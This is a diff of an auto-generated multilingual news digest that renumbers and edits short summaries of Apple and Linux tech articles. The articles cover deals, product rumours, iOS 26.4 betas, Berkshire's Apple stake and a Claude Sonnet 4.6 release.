@@ -5832,7 +5886,7 @@ Samsung 32-Inch Smart Monitor M9 for $1,299.99 $849.99, down from $1,999.99. Thi
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="AppleInsider">
 
-### 86. `EN` [Berkshire trims Apple stake but keeps the stock as a $62 billion anchor](data/articles/1e7a2c614266bf7a4e33ada0bd90462a.html)
+### 89. `EN` [Berkshire trims Apple stake but keeps the stock as a $62 billion anchor](data/articles/1e7a2c614266bf7a4e33ada0bd90462a.html)
 **Source:** AppleInsider | **Keyword:** `Apple`
 Berkshire Hathaway reduced its Apple stake by 4% in the fourth quarter of 2025, but Apple remains the conglomerate's largest equity holding by a wide margin. Berkshire Hathaway trims its Apple investment
 A February 17 regulatory filing with the U.S. Securities and Exchange Commission shows Berkshire trimmed its Apple position during the quarter ended December 31, 2025. Apple was still valued at roughly $62 billion within Berkshire's portfolio at year's end.
@@ -5842,7 +5896,7 @@ The filing also shows Berkshire sold 77% of its Amazon stake in the same quarter
 
 <div class="article-item" data-lang="fr" data-category="mac" data-source="iPhoneAddict">
 
-### 87. `FR` [Jeu concours iPhon.fr : gagnez l’une des 10 licences à vie pour l’app Secrets](data/articles/f72f839a9a7b63c5a8289947a5b433df.html)
+### 90. `FR` [Jeu concours iPhon.fr : gagnez l’une des 10 licences à vie pour l’app Secrets](data/articles/f72f839a9a7b63c5a8289947a5b433df.html)
 **Source:** iPhoneAddict | **Keyword:** `Apple`
 Valeur totale du lot mis ici en jeu : 90 € ! On vous explique participer. C'est très simple !
 
@@ -5850,7 +5904,7 @@ Valeur totale du lot mis ici en jeu : 90 € ! On vous explique participer. C'
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="9to5Mac">
 
-### 88. `EN` [Deals: Most affordable M5 iPad Pro nearly $200 off, Apple Watch Ultra 3 up to $155 off, Ocean Band, Trail Loop, more](data/articles/50f822b031b24ea4b622261a56b42824.html)
+### 91. `EN` [Deals: Most affordable M5 iPad Pro nearly $200 off, Apple Watch Ultra 3 up to $155 off, Ocean Band, Trail Loop, more](data/articles/50f822b031b24ea4b622261a56b42824.html)
 **Source:** 9to5Mac | **Keyword:** `Apple`
 Today’s 9to5Toys Lunch Break is now ready to go, starting off with new Amazon all-time lows on the most affordable M5 iPad Pro models – you will now find nearly $200 off the most attainable 11-inch configurations. Alongside a chance to score the latest Apple Watch Ultra 3 at $155 off, we also spotted new Amazon all-time low pricing on the Neon Green Ocean Band and the blue Apple Trail Loop at up to 41% off, joined by ongoing $300 price drops on 32GB M5 MacBook Pro models. Scope it all out down below. more…
 
@@ -5858,7 +5912,7 @@ Today’s 9to5Toys Lunch Break is now ready to go, starting off with new Amazon 
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="9to5Mac">
 
-### 89. `EN` [Apple TV unveils new psychological crime thriller coming soon](data/articles/c00ff2ab5f13907036816c5af007b03f.html)
+### 92. `EN` [Apple TV unveils new psychological crime thriller coming soon](data/articles/c00ff2ab5f13907036816c5af007b03f.html)
 **Source:** 9to5Mac | **Keyword:** `Apple`
 Apple TV just released the trailer for Imperfect Women, a new psychological thriller series revolving around the fallout from a shocking crime.
 more…
@@ -5867,7 +5921,7 @@ more…
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="AppleInsider">
 
-### 90. `EN` [Lowest price ever: M5 iPad Pro plunges to $799](data/articles/8617fceba7afcf62955570d4a15a8684.html)
+### 93. `EN` [Lowest price ever: M5 iPad Pro plunges to $799](data/articles/8617fceba7afcf62955570d4a15a8684.html)
 **Source:** AppleInsider | **Keyword:** `Apple`
 Amazon has slashed $200 off the M5 iPad Pro, bringing the cost down to a record low $799.91. Get an M5 iPad Pro for just $799.99 while supplies last - Image credit: Apple
 Apple's latest M5 11-inch iPad Pro is on sale at Amazon for $799.91 in Space Black, delivering the lowest price on record this Wednesday.
@@ -5877,17 +5931,7 @@ Buy M5 iPad Pro for $799.91 Continue Reading on AppleInsider | Discuss on our Fo
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="AppleInsider">
 
-### 91. `EN` [March madness: What Apple is getting ready to launch](data/articles/f5a133379ebbc4490c69003ef82a7083.html)
-**Source:** AppleInsider | **Keyword:** `Apple`
-With an Apple experience on March 4, the rumor mill is in overdrive. These are the best candidates — and the also-rans — for what Apple will launch and then have an "experience" to demo on March 4. The more likely Apple launches for early March
-It seems the March 4 Apple Experience won't be an actual launch of new products in Apple's catalog, but instead capping off multiple announcements during the week. That gives Apple a lot of opportunity to promote multiple items.
-With the breadth of rumored devices on the docket, including many anticipated for launch in earlu 2026. it certainly needs that opportunity. But, as ever, some have more chance of making an appearance than others. Continue Reading on AppleInsider | Discuss on our Forums
-
-</div>
-
-<div class="article-item" data-lang="en" data-category="mac" data-source="AppleInsider">
-
-### 92. `EN` [How to get into retro gaming on Apple TV with RetroArch](data/articles/809e822b5e2c8526045f41ba78c17932.html)
+### 94. `EN` [How to get into retro gaming on Apple TV with RetroArch](data/articles/809e822b5e2c8526045f41ba78c17932.html)
 **Source:** AppleInsider | **Keyword:** `Apple`
 You can play classic computer games from the comfort of your couch by using RetroArch with the Apple TV. Here's how to get retro gaming on Apple's streaming box. RetroArch works on the Apple TV
 
@@ -5895,7 +5939,7 @@ You can play classic computer games from the comfort of your couch by using Retr
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="AppleInsider">
 
-### 93. `EN` [March 4 international Apple Experiences may follow week of online launches](data/articles/cab94db92f76514646b74f62610b7a71.html)
+### 95. `EN` [March 4 international Apple Experiences may follow week of online launches](data/articles/cab94db92f76514646b74f62610b7a71.html)
 **Source:** AppleInsider | **Keyword:** `Apple`
 Apple may return to its marketing playbook, delivering multiple press releases of big products in just a few days, then highlight them all at the international March 4 "experiences." Apple's experience logo has many layers. The announcement of a special event on March 4 has led to wild speculation of what Apple could introduce at the time. However, with so many oddities surrounding it all, it may not be as straightforward as people think.
 On Tuesday, Daring Fireball's John Gruber proposed that Apple's reference of it as an "experience" day is unusual. The choice of holding the event on a Wednesday is also unexpected, especially when you factor in Apple's preference for Tuesday product announcements. Continue Reading on AppleInsider | Discuss on our Forums
@@ -5904,7 +5948,7 @@ On Tuesday, Daring Fireball's John Gruber proposed that Apple's reference of it 
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="9to5Mac">
 
-### 94. `EN` [The low-cost MacBook will get a slick video, not just a press release](data/articles/a3229948e0330ea7a9aa71492c4b0de3.html)
+### 96. `EN` [The low-cost MacBook will get a slick video, not just a press release](data/articles/a3229948e0330ea7a9aa71492c4b0de3.html)
 **Source:** 9to5Mac | **Keyword:** `Apple`
 Apple’s low-cost MacBook has been a long time coming, but it now seems clear that we can expect it to be launched in the first week of March.
 Apple has a special event taking place on March 4, but a subsequent report says that this will not include a keynote presentation. Instead, it says we can expect a series of press releases along the lines of the ones we saw back in 2024 …
@@ -5914,7 +5958,7 @@ more…
 
 <div class="article-item" data-lang="fr" data-category="mac" data-source="iPhoneAddict">
 
-### 95. `FR` [Le SSD portable SanDisk Extreme Pro 2 To tombe à 260 € (-42 %)](data/articles/8fabd89d4d5e60ce5617dde099b0ac56.html)
+### 97. `FR` [Le SSD portable SanDisk Extreme Pro 2 To tombe à 260 € (-42 %)](data/articles/8fabd89d4d5e60ce5617dde099b0ac56.html)
 **Source:** iPhoneAddict | **Keyword:** `Apple`
 Dépêchez-vous, car à -42 %, il ne va pas faire long feu !
 
@@ -5922,7 +5966,7 @@ Dépêchez-vous, car à -42 %, il ne va pas faire long feu !
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="AppleInsider">
 
-### 96. `EN` [Apple Music Connect is reborn as a marketing tool for the music industry](data/articles/5681409d5c40b752b30a4f9546dd7023.html)
+### 98. `EN` [Apple Music Connect is reborn as a marketing tool for the music industry](data/articles/5681409d5c40b752b30a4f9546dd7023.html)
 **Source:** AppleInsider | **Keyword:** `Apple`
 Apple's failed social media platform Apple Music Connect is back, but this time not for fans. Instead, it's a set of promotion tools for record labels. Apple Music has added a new central resource for record industry professionals
 It's not as if Apple starts up and abandons social media programs as often as Google kills off apps, but it feels close. Alongside better-known failures such as Ping, there was Apple Music Connect, which started in 2015 and died in 2019.
@@ -5931,7 +5975,7 @@ It's not as if Apple starts up and abandons social media programs as often as Go
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="Macworld">
 
-### 97. `EN` [The final countdown for Intel Mac apps has begun](data/articles/e3048c75b3bd196dc90eb6ba0acde113.html)
+### 99. `EN` [The final countdown for Intel Mac apps has begun](data/articles/e3048c75b3bd196dc90eb6ba0acde113.html)
 **Source:** Macworld | **Keyword:** `Apple`
 Macworld Apple has made a major announcement this week that could affect the software you use, especially if it’s an older app, and you are using an M-series Mac. In a support document, Apple wrote that it will start to phase out Rosetta functionality with macOS 28. That means in two years, apps that were written for Intel-based Macs will no longer run on M-series Macs, except for “certain older, unmaintained games.”
 When Apple began its switch from Intel chips to its own M-series chips in 2020, it changed the architecture of the underlying workings of the Mac. To help navigate the transition, Apple created Rosetta, which acts as a translator of Intel-based apps so they can run on M-series Macs. Rosetta will be included in macOS 27, which is expected to be released this fall. After that, Apple will limit the Rosetta implementation in macOS 28.
@@ -5944,7 +5988,7 @@ Application (Universal): The app was written for both Apple and Intel chips
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="MacRumors">
 
-### 98. `EN` [Perplexity Abandons AI Advertising Strategy Over Trust Worries](data/articles/b47472f16494feefd4636988457066bd.html)
+### 100. `EN` [Perplexity Abandons AI Advertising Strategy Over Trust Worries](data/articles/b47472f16494feefd4636988457066bd.html)
 **Source:** MacRumors | **Keyword:** `Apple`
 AI company Perplexity is stepping away from advertising over concerns that it will erode user trust, despite moves by rivals to introduce ads as an alternative money-making strategy. Perplexity was one of the first AI services to embrace ads in 2024, after it ran tests where sponsored answers appeared under the chatbot's answers. That approach however was phased out last year, and executives at the company now say they don't plan to revisit it, according to the Financial Times. "A user needs to believe this is the best possible answer, to keep using the product and be willing to pay for it," a Perplexity executive told the publication. earlier this month to show ads to ChatGPT users who have a free account or a low-cost Go subscription. OpenAI has said ads will not influence the answers that ChatGPT provides, nor will it provide advertisers with content from ChatGPT conversations. mocked OpenAI for its decision to show ads to users and has said it has no plans to do the same. The company argues that including ads in Claude would not be in line with its mission of creating a helpful assistant for work and deep thinking, and that users should not need to second-guess whether an AI is being helpful or "subtly steering the conversation towards something monetizable." Google features advertising in AI mode and in its AI Overviews summaries on traditional search results. However, Google has not introduced ads into its Gemini chatbot so far. Tag: Perplexity
 This article, "Perplexity Abandons AI Advertising Strategy Over Trust Worries" first appeared on MacRumors.com
@@ -5954,7 +5998,7 @@ Discuss this article in our forums
 
 <div class="article-item" data-lang="fr" data-category="mac" data-source="iPhoneAddict">
 
-### 99. `FR` [MacBook Air 13″ M4 à 949 € : l’offre du moment pour un Mac fin, puissant et endurant](data/articles/01b8033bcda812dd5c0b3d29798957a2.html)
+### 101. `FR` [MacBook Air 13″ M4 à 949 € : l’offre du moment pour un Mac fin, puissant et endurant](data/articles/01b8033bcda812dd5c0b3d29798957a2.html)
 **Source:** iPhoneAddict | **Keyword:** `Apple`
 Il n'y a pas une seconde à perdre si vous souhaitez profiter de 150 euros de remise sur le dernier MacBook Air.
 
@@ -5962,7 +6006,7 @@ Il n'y a pas une seconde à perdre si vous souhaitez profiter de 150 euros de re
 
 <div class="article-item" data-lang="fr" data-category="mac" data-source="iPhoneAddict">
 
-### 100. `FR` [Ces nouveautés d’iOS 26.4 sont aussi importantes que faciles à manquer](data/articles/4596776f7a5e848556360d97b60d0ed4.html)
+### 102. `FR` [Ces nouveautés d’iOS 26.4 sont aussi importantes que faciles à manquer](data/articles/4596776f7a5e848556360d97b60d0ed4.html)
 **Source:** iPhoneAddict | **Keyword:** `Apple`
 La première bêta développeurs regorge d'améliorations intéressantes.
 
@@ -5970,7 +6014,7 @@ La première bêta développeurs regorge d'améliorations intéressantes.
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="9to5Mac">
 
-### 101. `EN` [Apple’s March launch may include multiple days of press releases with no keynote, per rumor](data/articles/911e0cfc8ca7e01c561db7f76440786b.html)
+### 103. `EN` [Apple’s March launch may include multiple days of press releases with no keynote, per rumor](data/articles/911e0cfc8ca7e01c561db7f76440786b.html)
 **Source:** 9to5Mac | **Keyword:** `Apple`
 Yesterday, Apple announced a “special experience” for March 4 at 9 a.m. ET, inviting members of the press to New York, London, and Shanghai.
 The question right now is what format this “special experience” and the associated product announcements will take.
@@ -5980,7 +6024,7 @@ more…
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="MacRumors">
 
-### 102. `EN` [Claude Sonnet 4.6 Brings Improved Coding, Computer Use, and Office Tasks](data/articles/e33b719ed44e2ff5dde7034a8dc27bdb.html)
+### 104. `EN` [Claude Sonnet 4.6 Brings Improved Coding, Computer Use, and Office Tasks](data/articles/e33b719ed44e2ff5dde7034a8dc27bdb.html)
 **Source:** MacRumors | **Keyword:** `Apple`
 Anthropic today updated its Sonnet model to version 4.6, and the company says it is the most capable Sonnet model to date with upgrades across coding, computer use, long-context reasoning, agent planning, knowledge work, and design. Claude Sonnet 4.6 is the default for users who have Free and Pro plans, and it has an updated 1M token context window. Sonnet 4.6 improves consistency and instruction following for coding, it's better at computer use tasks, and it can complete office tasks that previously required an Opus model. Sonnet 4.6 has human-level capability for tasks like navigating a complex spreadsheet or filling out a multi-step web form. According to Anthropic, Sonnet 4.6 has a "a broadly warm, honest, prosocial, and at times funny character, very strong safety behaviors, and no signs of major concerns around high-stakes forms of misalignment." It offers Opus-level intelligence at a more affordable price point, so it is practical for a wider range of tasks. Opus 4.6 is still the better option for agentic coding, agentic code use, and multidisciplinary reasoning, but Sonnet 4.6 offers measurable improvements over Sonnet 4.5. Tag: Anthropic
 This article, "Claude Sonnet 4.6 Brings Improved Coding, Computer Use, and Office Tasks" first appeared on MacRumors.com
@@ -5990,7 +6034,7 @@ Discuss this article in our forums
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="9to5Mac">
 
-### 103. `EN` [tvOS 26.4 adds new ‘Continuous Audio Connection’ on Apple TV](data/articles/1a007a72b02a3ce4a80046f59e8ad99c.html)
+### 105. `EN` [tvOS 26.4 adds new ‘Continuous Audio Connection’ on Apple TV](data/articles/1a007a72b02a3ce4a80046f59e8ad99c.html)
 **Source:** 9to5Mac | **Keyword:** `Apple`
 In addition to removing the iTunes Movies and TV Shows apps from Apple TV, tvOS 26.4 also includes a new setting for “Continuous Audio Connection.”
 more…
@@ -5999,7 +6043,7 @@ more…
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="9to5Mac">
 
-### 104. `EN` [Car Keys in Apple Wallet just launched for a major new automaker](data/articles/09dc9e3bc3f435fe8f6fa07d913f4b60.html)
+### 106. `EN` [Car Keys in Apple Wallet just launched for a major new automaker](data/articles/09dc9e3bc3f435fe8f6fa07d913f4b60.html)
 **Source:** 9to5Mac | **Keyword:** `Apple`
 Apple says car keys in Wallet are set to expand significantly soon, and one major new automaker—Toyota—appears to have just launched support.
 more…
@@ -6008,7 +6052,7 @@ more…
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="9to5Mac">
 
-### 105. `EN` [iOS 26.4 adds more Sleep and Vitals data to Apple Health](data/articles/add369d21097ffe5c77d4015a129d784.html)
+### 107. `EN` [iOS 26.4 adds more Sleep and Vitals data to Apple Health](data/articles/add369d21097ffe5c77d4015a129d784.html)
 **Source:** 9to5Mac | **Keyword:** `Apple`
 Apple released iOS 26.4 beta 1 yesterday, and the update includes a variety of changes and new features. In addition to everything we’ve covered so far, there are two specific changes to the Health app: updates to the Vitals metric and sleep tracking.
 more…
@@ -6017,7 +6061,7 @@ more…
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="9to5Mac">
 
-### 106. `EN` [Hands-on: EcoFlow’s new MagSafe power bank does more than charge your iPhone](data/articles/5122dfd0e245f962d71b63ceb211916e.html)
+### 108. `EN` [Hands-on: EcoFlow’s new MagSafe power bank does more than charge your iPhone](data/articles/5122dfd0e245f962d71b63ceb211916e.html)
 **Source:** 9to5Mac | **Keyword:** `Apple`
 EcoFlow is most well-known for its home energy and large power station solutions. They have power stations that hold enough energy to run entire houses for days or weeks at a time. But recently they have been bringing that same battery know-how to a smaller and more consumer-friendly form factor. They have expanded their lineup with the new Rapid Mag power bank product line. The star of the show is their new MagSafe power bank that combines Qi2.2 wireless charging, a built-in USB-C cable, and an integrated kickstand into a slim 10,000mAh design. Here is why I think this is worth your consideration.
 more…
@@ -6026,7 +6070,7 @@ more…
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="AppleInsider">
 
-### 107. `EN` [Apple Intelligence pendant &amp; AirPods with cameras reportedly getting renewed focus](data/articles/ccd0cd7fbc4e582c7eb23c92cc1a8da0.html)
+### 109. `EN` [Apple Intelligence pendant &amp; AirPods with cameras reportedly getting renewed focus](data/articles/ccd0cd7fbc4e582c7eb23c92cc1a8da0.html)
 **Source:** AppleInsider | **Keyword:** `Apple`
 In the face of competition from Open AI and Meta, Apple is said to be redoubling its efforts to get a wearable pendant and camera-equipped AirPods right. A pin of the Apple Intelligence logo. Not an Apple Intelligence pin
 In a bid to follow the AI marketplace trends, Apple is rumored to be working on a number of new products that take advantage of artificial intelligence. If a Tuesday report on the topic is correct, Apple is keen to make them a reality.
@@ -6036,7 +6080,7 @@ According to Bloomberg, Apple held an all-hands meeting earlier in February. Dur
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="MacRumors">
 
-### 108. `EN` [Amazon's Latest AirPods Deals Include AirPods 4 at $99 and AirPods Max at $449](data/articles/d81a57806c48abaae82e4203910f5d0d.html)
+### 110. `EN` [Amazon's Latest AirPods Deals Include AirPods 4 at $99 and AirPods Max at $449](data/articles/d81a57806c48abaae82e4203910f5d0d.html)
 **Source:** MacRumors | **Keyword:** `Apple`
 Amazon this week has a pair of discounts on a few AirPods models, including the AirPods 4 and AirPods Max. You can get the AirPods 4 for $99.00, down from $129.00. Note: MacRumors is an affiliate partner with some of these vendors. When you click a link and make a purchase, we may receive a small payment, which helps us keep the site running. This is a second-best price on the AirPods 4, which is the base model without Active Noise Cancellation. Amazon provides a February 23 estimated delivery date for free shipping, with faster delivery options for Prime members. $30 OFF
 AirPods 4 for $99.00 $449.00, down from $549.00. This is the best price we've tracked so far in 2026 on the AirPods Max, and an overall second-best price on the headphones. $100 OFF
@@ -6045,7 +6089,7 @@ AirPods 4 for $99.00 $449.00, down from $549.00. This is the best price we've tr
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="9to5Mac">
 
-### 109. `EN` [Apple releases public beta 1 for watchOS 26.4, tvOS 26.4, more](data/articles/48b6ba19a98162a3b9c97ab22ea2ea80.html)
+### 111. `EN` [Apple releases public beta 1 for watchOS 26.4, tvOS 26.4, more](data/articles/48b6ba19a98162a3b9c97ab22ea2ea80.html)
 **Source:** 9to5Mac | **Keyword:** `Apple`
 Apple has new public beta 1 releases available now for watchOS 26.4, tvOS 26.4, and HomePod 26.4.
 more…
@@ -6054,7 +6098,7 @@ more…
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="9to5Mac">
 
-### 110. `EN` [macOS Tahoe 26.4 public beta debuts, here’s what’s new](data/articles/ccc766584c4d592c2d2167434768b1c4.html)
+### 112. `EN` [macOS Tahoe 26.4 public beta debuts, here’s what’s new](data/articles/ccc766584c4d592c2d2167434768b1c4.html)
 **Source:** 9to5Mac | **Keyword:** `Apple`
 Yesterday Apple shipped developer beta 1 for macOS Tahoe 26.4, and now that same release is available for public beta testers too. Here’s what’s new.
 more…
@@ -6063,7 +6107,7 @@ more…
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="9to5Mac">
 
-### 111. `EN` [Apple accelerating work on three new AI wearables, per report](data/articles/6fdc6c2a5d5d97fcfd077d7f77e19b8a.html)
+### 113. `EN` [Apple accelerating work on three new AI wearables, per report](data/articles/6fdc6c2a5d5d97fcfd077d7f77e19b8a.html)
 **Source:** 9to5Mac | **Keyword:** `Apple`
 According to a new report from Bloomberg, Apple is “accelerating” its development of three new wearable products, including smart glasses, an AI pendant, and camera-equipped AirPods.
 These products, the report says, are being “built around the Siri digital assistant.”
@@ -6073,7 +6117,7 @@ more…
 
 <div class="article-item" data-lang="fr" data-category="mac" data-source="iPhoneAddict">
 
-### 112. `FR` [Dyson Gen5detect Absolute : économisez 250 € sur l’un des meilleurs aspirateurs balai sans fil](data/articles/78f8435253d0d3379aa90ea42ed3a722.html)
+### 114. `FR` [Dyson Gen5detect Absolute : économisez 250 € sur l’un des meilleurs aspirateurs balai sans fil](data/articles/78f8435253d0d3379aa90ea42ed3a722.html)
 **Source:** iPhoneAddict | **Keyword:** `Apple`
 Le plus puissant des aspirateurs sans fil Dyson est à prix cassé pendant une durée limitée.
 
@@ -6081,7 +6125,7 @@ Le plus puissant des aspirateurs sans fil Dyson est à prix cassé pendant une d
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="9to5Mac">
 
-### 113. `EN` [Deals: AirTag 2, M4 MacBook Air 32GB/1TB $250 off, M5 MacBook Pro, Thunderbolt Pro Cable 46% off, more](data/articles/15b284b41e654818dda415be12008a3b.html)
+### 115. `EN` [Deals: AirTag 2, M4 MacBook Air 32GB/1TB $250 off, M5 MacBook Pro, Thunderbolt Pro Cable 46% off, more](data/articles/15b284b41e654818dda415be12008a3b.html)
 **Source:** 9to5Mac | **Keyword:** `Apple`
 While Presidents Day is behind us now, Amazon is keeping some of the deals rolling including the ongoing price drop on AirPods Pro 3 at within $10 of the holiday low. Today’s 9to5Toys Lunch Break is also highlighting the best chance to save yet on the new AirTag 2 with this 4-pack deal, as well as the 32GB M4 MacBook Air with 1TB storage live at $250 off and $250 off the most affordable 24GB M5 MacBook Pro. We also have rare deal on Apple’s black braided Thunderbolt Pro Cable down at $37 (46% off) and even more accessories down below. more…
 
@@ -6089,7 +6133,7 @@ While Presidents Day is behind us now, Amazon is keeping some of the deals rolli
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="9to5Mac">
 
-### 114. `EN` [When will new AirPods launch? Latest updates on AirPods Pro, AirPods Max 2, more](data/articles/26855f34ba893fc2b90b045d8e7c7bb5.html)
+### 116. `EN` [When will new AirPods launch? Latest updates on AirPods Pro, AirPods Max 2, more](data/articles/26855f34ba893fc2b90b045d8e7c7bb5.html)
 **Source:** 9to5Mac | **Keyword:** `Apple`
 Apple has new AirPods coming this year, though some models will have to wait a bit longer for an update. Here’s the latest launch timing for new AirPods Pro, AirPods Max 2, and AirPods 5.
 more…
@@ -6098,7 +6142,7 @@ more…
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="AppleInsider">
 
-### 115. `EN` [Final hours: Get Disney Plus and Hulu for $9.99 before the deal ends today](data/articles/5610c8ebc130bf047fe0e5fb826e1e19.html)
+### 117. `EN` [Final hours: Get Disney Plus and Hulu for $9.99 before the deal ends today](data/articles/5610c8ebc130bf047fe0e5fb826e1e19.html)
 **Source:** AppleInsider | **Keyword:** `Apple`
 Now through 1 p.m. Pacific Time, get a month of the Disney Plus and Hulu bundle for $9.99 — the best streaming deal in February. Get a Disney Plus and Hulu bundle today
 Disney is wrapping up a limited-time offer that drops one month of the ad-supported Disney Plus and Hulu bundle to $9.99 — a 26% discount off the standard $12.99 monthly price.
@@ -6107,7 +6151,7 @@ Disney is wrapping up a limited-time offer that drops one month of the ad-suppor
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="Macworld">
 
-### 116. `EN` [Get this super-fast Apple Thunderbolt 4 cable for nearly half off](data/articles/7b5e5cef7b9e3b75d27a8b86c69d5f7b.html)
+### 118. `EN` [Get this super-fast Apple Thunderbolt 4 cable for nearly half off](data/articles/7b5e5cef7b9e3b75d27a8b86c69d5f7b.html)
 **Source:** Macworld | **Keyword:** `Apple`
 Macworld We all have USB-C cables, but if you want to know what true speed is and get the most out of the ports on your MacBook, then you need a Thunderbolt 4 cable. Usually available for $69, you can get an Apple Thunderbolt 4 Pro cable for $37 at Woot, a fantastic discount.
 This Apple cable supports data transfer speeds of up to 40Gb/s, allowing you to move massive files in a blink and connect high-resolution monitors. The cable is also capable of 100W power delivery, so your gadgets will all fast-charge in no time. Apple’s cable makes it possible to connect your MacBook to displays and devices with TB4, including the Studio Display, the Pro Display XDR, docks, and hard drives, to name a few.
@@ -6123,7 +6167,7 @@ Mac Pro with M2 Ultra
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="AppleInsider">
 
-### 117. `EN` [Mac gamers chasing PC hits may finally have an answer in GameHub](data/articles/641cd3ab3e1c641758a211abfcd68cc7.html)
+### 119. `EN` [Mac gamers chasing PC hits may finally have an answer in GameHub](data/articles/641cd3ab3e1c641758a211abfcd68cc7.html)
 **Source:** AppleInsider | **Keyword:** `Apple`
 GameSir is finally offering something Mac gamers have been dreaming about for years — a way to unlock their entire Steam libraries on Apple Silicon, but the company has yet to explain how it actually works. GameSir claims to unlock Mac gaming
 
@@ -6131,27 +6175,10 @@ GameSir is finally offering something Mac gamers have been dreaming about for ye
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="9to5Mac">
 
-### 118. `EN` [Apple plans M5-based Private Cloud Compute architecture for Apple Intelligence](data/articles/fc53dd724266073a09bcf3357dba400d.html)
+### 120. `EN` [Apple plans M5-based Private Cloud Compute architecture for Apple Intelligence](data/articles/fc53dd724266073a09bcf3357dba400d.html)
 **Source:** 9to5Mac | **Keyword:** `Apple`
 According to a new Private Cloud Compute software release this week, Apple is starting to use M5 chips in Apple Private Cloud Compute servers. This is the infrastructure that powers Apple Intelligence’s cloud-based features.
 more…
-
-</div>
-
-<div class="article-item" data-lang="en" data-category="mac" data-source="9to5Mac">
-
-### 119. `EN` [iOS 26.4 preps for CarPlay video feature, code reveals](data/articles/b4654fda37bce95687ca2abf35e651a1.html)
-**Source:** 9to5Mac | **Keyword:** `Apple`
-iOS 26.4 is here, at least in beta form, and delving into the code has revealed that Apple is preparing for CarPlay to let you watch videos when parked.
-more…
-
-</div>
-
-<div class="article-item" data-lang="en" data-category="mac" data-source="9to5Mac">
-
-### 120. `EN` [Rode Wireless Pro and Wireless Go can now connect direct to iPhone](data/articles/01b4919dad4265913d92cf54b04d3337.html)
-**Source:** 9to5Mac | **Keyword:** `Apple`
-The Wireless Go users thanks to a firmware update … more…
 
 </div>
 
@@ -6618,9 +6645,17 @@ Security updates have been issued by AlmaLinux (gimp, go-toolset:rhel8, and gola
 
 </div>
 
+<div class="article-item" data-lang="fr" data-category="linux" data-source="Journal du Hacker">
+
+### 11. `FR` [Rétrogaming : RecalBox 10 s’ouvre aux Steam Deck et inaugure une nouvelle interface](data/articles/58119f191652b24aa06e3cf85580e759.html)
+**Source:** Journal du Hacker | **Keyword:** `Hacking`
+La distribution open source dédiée au rétrogaming RecalBox passe en version 10 avec, entre autres nouveautés, une compatibilité matérielle étendue aux dernières machines du moment. L’équipe annonce ainsi la prise en charge des derniers Raspberry Pi 5 (2 Go) et Raspberry Pi 500, des Steam Deck de Valve (LCD ou OLED), le support expérimental des Asus ROG Ally et Lenovo Legion Go, ainsi qu’une meilleure compatibilité globale avec les PC récents. La prise en charge s’étend aussi au niveau des composants et accessoires plus spécifiques au rétrogaming, avec support des boitiers Retroflag et Argon One v3, des spinners basés sur Arduino, et prise en charge expérimentale des pistolets GunCon 2 pour TV CRT. L’équipe garantit par ailleurs, logiquement, la prise en charge de ses propres accessoires comme le RGB Dual 2 qui avait recueilli 140 000 euros de précommandes sur Kickstarter fin 2025. RecalBox 10 inaugure de nouveaux thèmes graphiques Sur le volet logiciel, RecalBox 10 signe le début de l’émulation des consoles de sixième génération. Sur PC et Steam Deck, la Xbox originale est prise en charge, tandis que sur Pi 5 l’environnement donne accès aux jeux Nintendo DS, GameCube et Wii. Cette nouvelle version promet enfin une amélioration générale des performances et de l’interface avec, entre autres, un nouveau gestionnaire de thèmes et, surtout, un
+
+</div>
+
 <div class="article-item" data-lang="en" data-category="linux" data-source="Phoronix">
 
-### 11. `EN` [Arc B390 Graphics With Panther Lake Performing Great On Open-Source Intel Compute Runtime](data/articles/caf632f98dda41004a210c309670efc5.html)
+### 12. `EN` [Arc B390 Graphics With Panther Lake Performing Great On Open-Source Intel Compute Runtime](data/articles/caf632f98dda41004a210c309670efc5.html)
 **Source:** Phoronix | **Keyword:** `Benchmarks`
 This month I have been doing a lot of Panther Lake benchmarking under Linux with the Core Ultra X7 358H. One of the areas of much interest has been the Arc B390 Xe3 graphics that have been working nicely out-of-the-box with the Intel open-source driver stack on Linux although there still are some gaps to fill against Windows. Those Intel Arc B390 Linux benchmarks so far have been focused on OpenGL and Vulkan graphics, but what about OpenCL and GPU compute with the open-source Intel Compute Runtime? Today's article is looking at the performance of the Xe3 Panther Lake graphics on the newest Compute Runtime release compared to prior Intel graphics generations and the AMD Ryzen AI competition.
 
@@ -6628,7 +6663,7 @@ This month I have been doing a lot of Panther Lake benchmarking under Linux with
 
 <div class="article-item" data-lang="fr" data-category="linux" data-source="LinuxFr">
 
-### 12. `FR` [Concours - Gagnez une Raspberry Pi 5 avec Macé Robotics](data/articles/252fb89d752ed853c1cc0f0fe6036d60.html)
+### 13. `FR` [Concours - Gagnez une Raspberry Pi 5 avec Macé Robotics](data/articles/252fb89d752ed853c1cc0f0fe6036d60.html)
 **Source:** LinuxFr | **Keyword:** `France`
 À l’occasion de ses 10 ans de Macé Robotics, l’entreprise organise un concours qui se déroulera jusqu'au 26 février 2026.
